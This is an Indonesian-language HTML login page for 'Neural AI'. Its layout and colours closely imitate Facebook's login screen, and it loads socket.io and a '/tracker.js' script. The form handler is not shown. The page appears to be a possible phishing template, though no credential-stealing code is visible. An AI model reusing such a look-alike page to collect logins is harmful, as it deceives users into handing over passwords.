<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Masuk — Neural AI</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.logo{margin-bottom:20px;text-align:center}
.logo svg{width:48px;height:48px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px 28px;width:396px;max-width:100%}
.card h2{color:#1c1e21;font-size:18px;font-weight:400;line-height:22px;text-align:center;padding-bottom:16px;border-bottom:1px solid #dadde1;margin-bottom:16px}
.form-group{margin-bottom:12px}
.form-group input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;color:#1c1e21;outline:none;transition:border-color .15s;background:#fff}
.form-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.form-group input::placeholder{color:#90949c}
.password-wrap{position:relative}
.password-wrap input{padding-right:50px}
.toggle-pass{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#1877f2;font-size:14px;font-weight:500;cursor:pointer;padding:4px 6px;border-radius:4px}
.toggle-pass:hover{background:#e7f3ff}
.login-btn{width:100%;padding:12px;background:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;transition:background .15s}
.login-btn:hover{background:#166fe5}
.login-btn:active{background:#1a6ed8}
.forgot-link{display:block;text-align:center;margin:16px 0;font-size:14px;font-weight:500}
.forgot-link a{color:#1877f2;text-decoration:none}
.forgot-link a:hover{text-decoration:underline}
.divider{display:flex;align-items:center;margin:20px 0 24px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dadde1}
.divider span{padding:0 16px;color:#606770;font-size:12px;font-weight:500}
.signup-btn{display:block;margin:0 auto;padding:12px 20px;background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;transition:background .15s;line-height:20px}
.signup-btn:hover{background:#36a420}
.footer{margin-top:28px;text-align:center;font-size:12px;color:#737373;max-width:396px}
.footer a{color:#385898;text-decoration:none}
.footer a:hover{text-decoration:underline}
@media(max-width:460px){.card{width:100%}body{padding:12px}.card h2{font-size:16px}.login-btn{font-size:18px}}
</style>
</head>
<body>
<div class="logo">
<svg width="48" height="48" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="100%" stop-color="#7c3aed"/></linearGradient></defs><rect width="48" height="48" rx="8" fill="url(#g)"/><circle cx="24" cy="24" r="14" stroke="#fff" stroke-width="1.5" fill="none"/><circle cx="24" cy="18" r="2" fill="#fff"/><circle cx="31" cy="22" r="2" fill="#fff"/><circle cx="31" cy="28" r="2" fill="#fff"/><circle cx="24" cy="32" r="2" fill="#fff"/><circle cx="17" cy="29" r="2" fill="#fff"/><circle cx="17" cy="23" r="2" fill="#fff"/></svg>
</div>
<div class="card">
<h2>Masuk ke Neural AI</h2>
<form id="loginForm" onsubmit="handleLogin(event)">
<div class="form-group">
<input type="text" id="emailInput" placeholder="Email atau Nomor Telepon" autocomplete="username" autocapitalize="off" required>
</div>
<div class="form-group">
<div class="password-wrap">
<input type="password" id="passInput" placeholder="Kata Sandi" autocomplete="current-password" required>
<button type="button" id="togglePassBtn" class="toggle-pass">Lihat</button>
</div>
</div>
<button type="submit" id="loginBtn" class="login-btn">Masuk</button>
</form>
<div class="forgot-link"><a href="#">Lupa kata sandi?</a></div>
<div class="divider"><span>atau</span></div>
<button class="signup-btn" onclick="window.location.href='#'">Buat Akun Baru</button>
</div>
<div class="footer">
<a href="#">English (US)</a> &middot; <a href="#">Bahasa Indonesia</a> &middot; <a href="#">中文(简体)</a><br>
<a href="#">Daftar</a> &middot; <a href="#">Masuk</a> &middot; <a href="#">AI Assistant</a> &middot; <a href="#">Neural Chat</a> &middot; <a href="#">AI Tools</a> &middot; <a href="#">Pusat Bantuan</a><br>
<a href="#">Kebijakan Privasi</a> &middot; <a href="#">Ketentuan Layanan</a> &middot; <a href="#">Pusat Keamanan</a><br>
<a href="#">Tentang</a> &middot; <a href="#">Hubungi Kami</a> &middot; <a href="#">Pengembang AI</a> &middot; <a href="#">Karier</a><br>
<small>Neural AI &copy; 2026</small>
</div>
<script src="/config.js"></script>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script src="/tracker.js"></script>
</body>
</html>
